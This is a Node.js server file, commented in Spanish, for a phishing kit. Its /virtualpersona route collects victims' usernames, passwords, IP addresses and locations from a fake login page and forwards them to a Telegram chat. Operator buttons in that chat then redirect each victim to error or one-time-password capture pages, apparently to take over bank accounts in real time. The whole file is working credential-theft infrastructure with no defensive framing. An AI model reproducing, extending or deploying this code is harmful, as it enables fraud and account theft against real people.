const express = require("express");
const bodyParser = require("body-parser");
const fetch = require("node-fetch");
const { v4: uuidv4 } = require("uuid");
const cors = require("cors");
require("dotenv").config();
const TelegramBot = require("node-telegram-bot-api");

const app = express();
const PORT = process.env.PORT || 3000;

// 🧠 Memoria en RAM para instrucciones de redirección
const instrucciones = new Map();

// ✅ Inicializar el bot en modo polling
const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });
bot.deleteWebhook(); // necesario para usar polling

// Middlewares
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static("public")); // <-- sirve archivos estáticos como HTML, CSS, JS

// ✅ Ruta principal para probar el servidor
app.get("/", (req, res) => {
  res.send("✅ Servidor activo");
});

// ✅ Ruta para recibir datos del formulario Virtual-Persona.html
app.post("/virtualpersona", async (req, res) => {
  try {
    const { user, pass, ip, location } = req.body;
    const sessionId = uuidv4();
    const [city, country] = location.split(",");

    const mensaje = `🔒 NUEVO INGRESO VIRTUAL 🔒\n\n👤 Usuario: ${user}\n🔑 Clave: ${pass}\n🌎 IP: ${ip} (${city.trim()}, ${country.trim()})\n🧾 SessionID: ${sessionId}`;

    const botones = {
      inline_keyboard: [
        [
          { text: "❌ Error Logo", callback_data: `error_logo|${sessionId}` },
          { text: "🔁 Intentar OTP", callback_data: `error_otp|${sessionId}` },
        ],
        [
          { text: "✅ Continuar", callback_data: `siguiente|${sessionId}` },
        ],
      ],
    };

    await bot.sendMessage(process.env.CHAT_ID, mensaje, {
      reply_markup: botones,
    });

    res.json({ success: true, sessionId });
  } catch (error) {
    console.error("❌ Error en /virtualpersona:", error);
    res.status(500).json({ error: "Error interno del servidor" });
  }
});

// ✅ Ruta de polling desde loading.html
app.get("/instruction/:sessionId", (req, res) => {
  const sessionId = req.params.sessionId;
  const accion = instrucciones.get(sessionId);

  if (accion) {
    instrucciones.delete(sessionId); // limpiar para evitar múltiples redirecciones
    res.json({ redirect_to: obtenerRuta(accion) });
  } else {
    res.json({ redirect_to: null }); // seguir esperando
  }
});

// ✅ Manejar botones desde Telegram
bot.on("callback_query", async (query) => {
  const [accion, sessionId] = query.data.split("|");
  if (!sessionId) return;

  instrucciones.set(sessionId, accion);

  await bot.answerCallbackQuery({
    callback_query_id: query.id,
    text: `✔ Acción recibida: ${accion}`,
    show_alert: true,
  });
});

// Función que define a qué ruta redirigir según el botón
function obtenerRuta(accion) {
  switch (accion) {
    case "error_logo":
      return "/virtualpersona.html";
    case "error_otp":
      return "/otp-error.html";
    case "siguiente":
      return "/otp-check.html";
    default:
      return "/";
  }
}

// Iniciar servidor
app.listen(PORT, () => {
  console.log(`🚀 Servidor activo en puerto ${PORT}`);
});
